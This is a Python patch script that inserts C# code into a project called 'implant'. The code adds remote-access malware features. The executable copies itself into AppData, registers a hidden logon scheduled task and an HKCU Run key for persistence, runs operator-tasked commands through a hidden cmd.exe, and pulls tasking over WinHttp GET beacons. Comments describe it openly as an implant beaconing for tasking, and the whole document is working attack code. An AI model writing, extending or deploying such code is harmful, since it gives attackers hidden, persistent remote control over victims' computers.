# one-shot: append persistence + task-exec + beacon plumbing to Stages.cs / Program.cs / Exfil.cs
import io

# ---------------- Stages.cs additions ----------------
STAGES_ADD = r'''
        // ------------------------------------------------------------ persist
        // user-level persistence: staged copy + logon scheduled task + HKCU Run.
        // no elevation required; both triggers relaunch with --loop so the
        // implant keeps beaconing for tasking.
        public static string PersistStage(string pname, int loopSec, int jitterSec)
        {
            string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return "no-exe";
            string dir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft");
            string dst = Path.Combine(dir, pname + ".exe");
            try
            {
                Directory.CreateDirectory(dir);
                if (!File.Exists(dst))
                    File.Copy(exe, dst, false);
                else if (File.GetLastWriteTimeUtc(exe) > File.GetLastWriteTimeUtc(dst))
                    try { File.Copy(exe, dst, true); } catch { }
            }
            catch (Exception e) { return "copy-fail:" + e.Message; }

            string args = "--loop " + loopSec + " --jitter " + jitterSec;
            string tr = "\"" + dst + "\" " + args;

            // 1) scheduled task at logon (user scope, hidden)
            string taskName = pname;
            bool taskOk = false;
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("schtasks",
                    "/Create /F /TN " + taskName + " /TR \"" + tr + "\" /SC ONLOGON");
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi)) { p.WaitForExit(6000); taskOk = p.ExitCode == 0; }
            }
            catch { }

            // 2) HKCU Run key (fallback + redundancy)
            bool runOk = false;
            try
            {
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run")
                    .SetValue(pname, tr);
                runOk = true;
            }
            catch { }

            return "task=" + taskOk + ",run=" + runOk + ",path=" + dst;
        }

        public static string CheckPersistence(string pname)
        {
            string s = "";
            try
            {
                object v = Microsoft.Win32.Registry.CurrentUser
                    .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run")
                    .GetValue(pname);
                if (v != null) s += "runkey";
            }
            catch { }
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("schtasks", "/Query /TN " + pname);
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                using (Process p = Process.Start(psi))
                {
                    p.WaitForExit(6000);
                    if (p.ExitCode == 0) s += (s.Length > 0 ? "," : "") + "task";
                }
            }
            catch { }
            return s.Length > 0 ? s : "none";
        }

        // hidden shell command for tasked exec -- output becomes a part
        public static byte[] RunTaskCommand(string cmd, int timeoutMs)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
                psi.StandardOutputEncoding = System.Text.Encoding.UTF8;
                psi.StandardErrorEncoding = System.Text.Encoding.UTF8;
                using (Process p = Process.Start(psi))
                {
                    string o = p.StandardOutput.ReadToEnd();
                    string e2 = p.StandardError.ReadToEnd();
                    if (!p.WaitForExit(timeoutMs)) try { p.Kill(); } catch { }
                    string all = (o + (e2.Length > 0 ? "\n[stderr]\n" + e2 : ""));
                    byte[] b = System.Text.Encoding.UTF8.GetBytes(all);
                    if (b.Length > 4 * 1024 * 1024)
                        Array.Resize(ref b, 4 * 1024 * 1024);
                    return b;
                }
            }
            catch (Exception ex)
            {
                return System.Text.Encoding.UTF8.GetBytes("exec-fail: " + ex.Message);
            }
        }
'''

# ---------------- Exfil.cs additions ----------------
EXFIL_ADD = r'''
        // minimal HTTP GET (beacon / task pull); returns null on non-200
        public static byte[] Get(string url)
        {
            try
            {
                string host; int port; string path; bool tls;
                if (!ParseUrl(url, out host, out port, out path, out tls)) return null;
                IntPtr hSession = Native.WinHttpOpen(null, 0, null, null, 0);
                if (hSession == IntPtr.Zero) return null;
                try
                {
                    IntPtr hConnect = Native.WinHttpConnect(hSession, host, (ushort)port, 0);
                    if (hConnect == IntPtr.Zero) return null;
                    try
                    {
                        IntPtr hRequest = Native.WinHttpOpenRequest(hConnect, "GET", path,
                            null, null, null, tls ? (uint)0x00800000 : 0);
                        if (hRequest == IntPtr.Zero) return null;
                        try
                        {
                            ApplyAuth(hRequest);
                            if (!Native.WinHttpSendRequest(hRequest, null, 0, IntPtr.Zero, 0, 0, 0))
                                return null;
                            if (!Native.WinHttpReceiveResponse(hRequest, IntPtr.Zero))
                                return null;
                            int[] status = new int[1]; int sz = 4; int got;
                            Native.WinHttpQueryHeaders(hRequest, 19 | 0x20000000,
                                null, status, ref sz, out got);   // QUERY_STATUS_CODE
                            if (status[0] != 200) return null;
                            using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
                            {
                                byte[] buf = new byte[64 * 1024];
                                while (true)
                                {
                                    uint read;
                                    if (!Native.WinHttpReadData(hRequest, buf, (uint)buf.Length, out read))
                                        break;
                                    if (read == 0) break;
                                    ms.Write(buf, 0, (int)read);
                                }
                                return ms.ToArray();
                            }
                        }
                        finally { Native.WinHttpCloseHandle(hRequest); }
                    }
                    finally { Native.WinHttpCloseHandle(hConnect); }
                }
                finally { Native.WinHttpCloseHandle(hSession); }
            }
            catch { return null; }
        }
'''

src = open("implant/Stages.cs", encoding="utf-8").read()
anchor = "        // ------------------------------------------------------------ sysinfo"
assert anchor in src
src = src.replace(anchor, STAGES_ADD + "\n" + anchor, 1)
open("implant/Stages.cs", "w", encoding="utf-8").write(src)

ex = open("implant/Exfil.cs", encoding="utf-8").read()
# append Get() inside the Exfil class: find last closing of class
marker = "public static bool WriteOut"
assert marker in ex
src2 = ex.replace(marker, EXFIL_ADD + "\n        " + marker, 1)
open("implant/Exfil.cs", "w", encoding="utf-8").write(src2)
print("stages + exfil extended")
